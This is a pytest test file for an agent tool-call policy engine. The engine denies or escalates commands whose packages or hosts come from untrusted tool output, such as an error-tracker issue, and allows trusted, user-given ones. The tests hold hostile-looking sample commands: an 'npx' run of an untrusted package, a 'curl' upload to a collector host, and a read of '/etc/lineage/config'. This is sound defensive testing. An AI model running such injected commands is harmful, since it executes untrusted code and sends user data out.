from datetime import UTC, datetime

import pytest

from lineage_core.models import (
    Binding,
    Decision,
    EntityRecord,
    Run,
    RunStatus,
    SourceTier,
    Span,
)
from lineage_core.rules import evaluate

POLICY = {
    "allowlist": {"hosts": ["registry.demo"], "packages": []},
}


def event(tool: str, **tool_input: str) -> dict:
    return {"tool_name": tool, "tool_input": tool_input}


def indexed(entity: str, tier: SourceTier, source: str = "workspace") -> dict:
    span = Span(
        id="span-1",
        run_id="run-1",
        source=source,
        tool_name=source,
        tier=tier,
        text=entity,
    )
    record = EntityRecord(
        entity=entity,
        best_tier=tier,
        first_span_by_tier={tier: span.id},
        first_seen_ts=datetime.now(UTC),
    )
    return {entity: record, "_spans": {span.id: span}}


def test_k0_fires_and_active_run_allows() -> None:
    denied = evaluate(
        Run(id="run-1", status=RunStatus.REVOKED),
        event("Read", file_path="/workspace/a"),
        {},
        POLICY,
    )
    assert (denied.rule_id, denied.decision) == ("K0", Decision.DENY)
    assert evaluate(Run(id="run-1"), event("Read", file_path="/workspace/a"), {}, POLICY).decision == Decision.ALLOW


def test_s1_fires_and_normal_workspace_path_allows() -> None:
    denied = evaluate(
        Run(id="run-1"),
        event("Bash", command="cat /etc/lineage/config"),
        {},
        POLICY,
    )
    assert denied.rule_id == "S1"
    assert evaluate(Run(id="run-1"), event("Read", file_path="/workspace/a"), {}, POLICY).decision == Decision.ALLOW


def test_i1_fires_and_allowed_mcp_tool_passes() -> None:
    run = Run(id="run-1", mcp_allow=["errortrack.get_issue"])
    denied = evaluate(run, event("mcp__errortrack__delete_issue"), {}, POLICY)
    assert denied.rule_id == "I1"
    assert evaluate(run, event("mcp__errortrack__get_issue"), {}, POLICY).decision == Decision.ALLOW


@pytest.mark.parametrize("mode", ["interactive", "autonomous"])
def test_l1a_always_denies_untrusted_code(mode: str) -> None:
    command = "npx @acme-diag/fix --diagnose"
    result = evaluate(
        Run(id="run-1", mode=mode),
        event("Bash", command=command),
        indexed(
            "pkg:npm:@acme-diag/fix",
            SourceTier.UNTRUSTED,
            "mcp__errortrack__get_issue",
        ),
        POLICY,
    )
    assert (result.rule_id, result.decision) == ("L1a", Decision.DENY)
    assert "errortrack.get_issue" in result.reason


def test_l1a_allow_case_is_trusted_package() -> None:
    result = evaluate(
        Run(id="run-1"),
        event("Bash", command="npx cowsay hi"),
        indexed("pkg:npm:cowsay", SourceTier.TRUSTED, "user-prompt"),
        POLICY,
    )
    assert result.decision == Decision.ALLOW


@pytest.mark.parametrize(
    ("mode", "decision"), [("interactive", Decision.ASK), ("autonomous", Decision.DENY)]
)
def test_l1b_mode_semantics(mode: str, decision: Decision) -> None:
    result = evaluate(
        Run(id="run-1", mode=mode),
        event("Bash", command="curl http://collector.demo/upload"),
        indexed(
            "host:collector.demo",
            SourceTier.UNTRUSTED,
            "mcp__errortrack__get_issue",
        ),
        POLICY,
    )
    assert (result.rule_id, result.decision) == ("L1b", decision)


def test_l1b_allow_case_binding_host_is_trusted() -> None:
    binding = Binding(
        id="staging-infra",
        env_var="STAGING_TOKEN",
        secret_ref="lineage/custody/staging-infra",
        hosts=["infra.demo"],
    )
    result = evaluate(
        Run(id="run-1", bindings=[binding]),
        event(
            "Bash",
            command='curl -H "Authorization: Bearer $STAGING_TOKEN" '
            "http://infra.demo/v1/envs/staging/status",
        ),
        {},
        POLICY,
    )
    assert result.decision == Decision.ALLOW


def test_l2_fires_for_unknown_entity_and_known_entity_allows() -> None:
    action = event("Bash", command="npx cowsay hi")
    assert evaluate(Run(id="run-1"), action, {}, POLICY).rule_id == "L2"
    assert evaluate(
        Run(id="run-1"),
        action,
        indexed("pkg:npm:cowsay", SourceTier.TRUSTED, "user-prompt"),
        POLICY,
    ).decision == Decision.ALLOW


def test_l3_fires_for_checked_entity_and_trusted_entity_allows() -> None:
    action = event("Bash", command="curl https://api.example.com/v1")
    checked = evaluate(
        Run(id="run-1"),
        action,
        indexed("host:api.example.com", SourceTier.CHECKED, "/workspace/DEPLOY.md"),
        POLICY,
    )
    assert checked.rule_id == "L3"
    trusted = evaluate(
        Run(id="run-1"),
        action,
        indexed("host:api.example.com", SourceTier.TRUSTED, "user-prompt"),
        POLICY,
    )
    assert trusted.decision == Decision.ALLOW


def test_t1_fires_only_when_strict() -> None:
    action = event("Bash", command="curl https://api.example.com/v1")
    index = indexed("host:api.example.com", SourceTier.TRUSTED, "user-prompt")
    strict = evaluate(Run(id="run-1", strict=True), action, index, POLICY)
    assert (strict.rule_id, strict.decision) == ("T1", Decision.ASK)
    assert evaluate(Run(id="run-1", strict=False), action, index, POLICY).decision == Decision.ALLOW


def test_low_risk_npm_test_allows() -> None:
    result = evaluate(
        Run(id="run-1"),
        event("Bash", command="npm test"),
        indexed("pkg:npm:@acme-diag/fix", SourceTier.UNTRUSTED),
        POLICY,
    )
    assert result.decision == Decision.ALLOW
